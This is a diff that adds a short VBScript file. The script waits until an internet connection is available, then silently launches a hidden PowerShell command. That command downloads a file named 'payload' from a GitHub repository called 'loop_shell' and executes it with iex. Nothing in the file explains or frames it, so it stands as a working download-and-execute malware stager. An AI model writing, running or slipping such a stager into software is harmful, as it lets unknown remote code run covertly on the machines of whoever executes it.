@@ -1,1 +1,27 @@
+Set objShell = CreateObject("WScript.Shell")
 
+' Loop to keep checking for internet connection
+Do
+    If isInternetAvailable() Then
+        ' Run PowerShell command
+        powershellCommand = "powershell.exe -Command ""iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex"""
+        objShell.Run powershellCommand, 0, False
+        Exit Do ' Exit after execution
+    Else
+        WScript.Sleep 5000 ' Wait 5 seconds before checking again
+    End If
+Loop
+
+Function isInternetAvailable()
+    Dim http
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    On Error Resume Next
+    http.Open "GET", "http://www.google.com", False
+    http.Send
+    If http.Status = 200 Then
+        isInternetAvailable = True
+    Else
+        isInternetAvailable = False
+    End If
+    Set http = Nothing
+End Function
